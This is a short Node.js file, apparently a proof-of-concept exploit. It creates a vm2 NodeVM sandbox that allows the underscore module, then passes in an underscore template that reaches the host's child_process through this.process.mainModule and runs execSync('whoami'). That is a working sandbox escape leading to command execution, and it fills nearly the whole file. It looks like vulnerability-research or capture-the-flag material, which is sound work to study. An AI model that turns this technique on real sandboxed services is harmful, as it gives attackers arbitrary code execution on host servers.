const express = require('express');
const app = express();
const { NodeVM } = require('vm2');
const underscore = require('underscore')
const under = underscore()
const vm = new NodeVM({
    require:{
        external: {
            modules: ["underscore"]
        }
    }
});

script = `console.log(require('underscore').template("<% print(this.process.mainModule.require('child_process').execSync('whoami')) %>")())`

vm.run(script,'vm.js')
